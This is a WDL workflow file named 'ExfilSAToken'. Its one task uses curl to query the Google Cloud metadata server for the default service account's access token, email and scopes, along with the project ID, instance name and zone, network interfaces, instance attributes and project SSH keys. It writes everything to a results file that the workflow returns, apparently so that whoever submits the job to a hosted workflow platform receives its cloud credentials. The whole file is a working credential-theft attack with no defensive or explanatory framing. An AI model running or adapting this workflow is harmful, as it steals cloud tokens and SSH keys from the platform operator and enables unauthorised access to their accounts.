version 1.0

workflow ExfilSAToken {
    call GetToken
}

task GetToken {
    command <<<
        echo "=== GCP Metadata ===" > results.txt
        
        # SA token from metadata
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
          >> results.txt 2>&1
        echo "" >> results.txt
        
        # SA email
        echo "=== SA Email ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
          >> results.txt 2>&1
        echo "" >> results.txt
        
        # SA scopes
        echo "=== SA Scopes ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" \
          >> results.txt 2>&1
        echo "" >> results.txt
        
        # Project ID
        echo "=== Project ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/project-id" \
          >> results.txt 2>&1
        echo "" >> results.txt
        
        # Instance metadata
        echo "=== Instance ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/name" \
          >> results.txt 2>&1
        echo "" >> results.txt
        
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/zone" \
          >> results.txt 2>&1
        echo "" >> results.txt
        
        # Network interfaces
        echo "=== Network ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/?recursive=true" \
          >> results.txt 2>&1
        echo "" >> results.txt
        
        # K8s attributes (if on GKE)
        echo "=== K8s Attributes ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true" \
          >> results.txt 2>&1
        echo "" >> results.txt
        
        # Custom metadata / SSH keys
        echo "=== Project SSH Keys ===" >> results.txt
        curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys" \
          >> results.txt 2>&1
        echo "" >> results.txt
    >>>

    output {
        File result = "results.txt"
    }

    runtime {
        docker: "curlimages/curl:latest"
    }
}
